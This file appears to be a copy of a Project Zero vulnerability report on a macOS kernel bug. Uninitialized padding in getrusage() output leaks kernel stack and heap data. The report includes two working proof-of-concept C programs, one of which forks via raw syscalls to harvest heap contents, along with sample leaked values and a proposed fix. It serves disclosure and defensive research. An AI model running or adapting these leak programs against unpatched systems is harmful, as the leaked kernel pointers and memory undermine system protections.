@@ -1,0 +1,201 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1405
+
+For 64-bit processes, the getrusage() syscall handler converts a `struct rusage` to a `struct user64_rusage` using `munge_user64_rusage()`, then copies the `struct user64_rusage` to userspace:
+
+int
+getrusage(struct proc *p, struct getrusage_args *uap, __unused int32_t *retval)
+{
+  struct rusage *rup, rubuf;
+  struct user64_rusage rubuf64;
+  struct user32_rusage rubuf32;
+  size_t retsize = sizeof(rubuf);     // default: 32 bits 
+  caddr_t retbuf = (caddr_t)&rubuf;   // default: 32 bits 
+  struct timeval utime;
+  struct timeval stime;
+
+
+  switch (uap->who) {
+  case RUSAGE_SELF:
+    calcru(p, &utime, &stime, NULL);
+    proc_lock(p);
+    rup = &p->p_stats->p_ru;
+    rup->ru_utime = utime;
+    rup->ru_stime = stime;
+
+    rubuf = *rup;
+    proc_unlock(p);
+
+    break;
+  [...]
+  }
+  if (IS_64BIT_PROCESS(p)) {
+    retsize = sizeof(rubuf64);
+    retbuf = (caddr_t)&rubuf64;
+    munge_user64_rusage(&rubuf, &rubuf64);
+  } else {
+    [...]
+  }
+
+  return (copyout(retbuf, uap->rusage, retsize));
+}
+
+`munge_user64_rusage()` performs the conversion by copying individual fields:
+
+__private_extern__  void 
+munge_user64_rusage(struct rusage *a_rusage_p, struct user64_rusage *a_user_rusage_p)
+{
+  // timeval changes size, so utime and stime need special handling 
+  a_user_rusage_p->ru_utime.tv_sec = a_rusage_p->ru_utime.tv_sec;
+  a_user_rusage_p->ru_utime.tv_usec = a_rusage_p->ru_utime.tv_usec;
+  a_user_rusage_p->ru_stime.tv_sec = a_rusage_p->ru_stime.tv_sec;
+  a_user_rusage_p->ru_stime.tv_usec = a_rusage_p->ru_stime.tv_usec;
+[...]
+}
+
+`struct user64_rusage` contains four bytes of struct padding behind each `tv_usec` element:
+
+#define _STRUCT_USER64_TIMEVAL    struct user64_timeval
+_STRUCT_USER64_TIMEVAL
+{
+  user64_time_t            tv_sec;        // seconds 
+  __int32_t                tv_usec;       // and microseconds 
+};
+
+struct  user64_rusage {
+  struct user64_timeval ru_utime; // user time used 
+  struct user64_timeval ru_stime; // system time used 
+  user64_long_t ru_maxrss;    // max resident set size 
+[...]
+};
+
+This padding is not initialized, but is copied to userspace.
+
+
+The following test results come from a Macmini7,1 running macOS 10.13 (17A405), Darwin 17.0.0.
+
+
+Just leaking stack data from a previous syscall seems to mostly return the upper halfes of some kernel pointers.
+The returned data seems to come from the previous syscall:
+
+$ cat test.c
+#include <sys/resource.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+void do_leak(void) {
+  static struct rusage ru;
+  getrusage(RUSAGE_SELF, &ru);
+  static unsigned int leak1, leak2;
+  memcpy(&leak1, ((char*)&ru)+12, 4);
+  memcpy(&leak1, ((char*)&ru)+28, 4);
+  printf("leak1: 0x%08x\n", leak1);
+  printf("leak2: 0x%08x\n", leak2);
+}
+
+int main(void) {
+  do_leak();
+  do_leak();
+  do_leak();
+  int fd = open("/dev/null", O_RDONLY);
+  do_leak();
+  int dummy;
+  read(fd, &dummy, 4);
+  do_leak();
+  return 0;
+}
+$ gcc -o test test.c && ./test
+leak1: 0x00000000
+leak2: 0x00000000
+leak1: 0xffffff80
+leak2: 0x00000000
+leak1: 0xffffff80
+leak2: 0x00000000
+leak1: 0xffffff80
+leak2: 0x00000000
+leak1: 0xffffff81
+leak2: 0x00000000
+
+
+However, I believe that this can also be used to disclose kernel heap memory.
+When the stack freelists are empty, stack_alloc_internal() allocates a new kernel stack
+without zeroing it, so the new stack contains data from previous heap allocations.
+The following testcase, when run after repeatedly reading a wordlist into memory,
+leaks some non-pointer data that seems to come from the wordlist:
+
+$ cat forktest.c 
+*/
+
+#include <sys/resource.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+void do_leak(void) {
+  static struct rusage ru;
+  getrusage(RUSAGE_SELF, &ru);
+  static unsigned int leak1, leak2;
+  memcpy(&leak1, ((char*)&ru)+12, 4);
+  memcpy(&leak2, ((char*)&ru)+28, 4);
+  char str[1000];
+  if (leak1 != 0) {
+    sprintf(str, "leak1: 0x%08x\n", leak1);
+    write(1, str, strlen(str));
+  }
+  if (leak2 != 0) {
+    sprintf(str, "leak2: 0x%08x\n", leak2);
+    write(1, str, strlen(str));
+  }
+}
+
+void leak_in_child(void) {
+  int res_pid, res2;
+  asm volatile(
+    "mov $0x02000002, %%rax\n\t"
+    "syscall\n\t"
+  : "=a"(res_pid), "=d"(res2)
+  :
+  : "cc", "memory", "rcx", "r11"
+  );
+  //write(1, "postfork\n", 9);
+  if (res2 == 1) {
+    //write(1, "child\n", 6);
+    do_leak();
+    char dummy;
+    read(0, &dummy, 1);
+    asm volatile(
+      "mov $0x02000001, %rax\n\t"
+      "mov $0, %rdi\n\t"
+      "syscall\n\t"
+    );
+  }
+  //printf("fork=%d:%d\n", res_pid, res2);
+  int wait_res;
+  //wait(&wait_res);
+}
+
+int main(void) {
+  for(int i=0; i<1000; i++) {
+    leak_in_child();
+  }
+}
+/*
+$ gcc -o forktest forktest.c && ./forktest
+leak1: 0x1b3b1320
+leak1: 0x00007f00
+leak1: 0x65686375
+leak1: 0x410a2d63
+leak1: 0x8162ced5
+leak1: 0x65736168
+leak1: 0x0000042b
+
+The leaked values include the strings "uche", "c-\nA" and "hase", which could plausibly come from the wordlist.
+
+
+Apart from fixing the actual bug here, it might also make sense to zero stacks when stack_alloc_internal() grabs pages from the generic allocator with kernel_memory_allocate() (by adding KMA_ZERO or so). As far as I can tell, that codepath should only be executed very rarely under normal circumstances, and this change should at least break the trick of leaking heap contents through the stack.
+*/
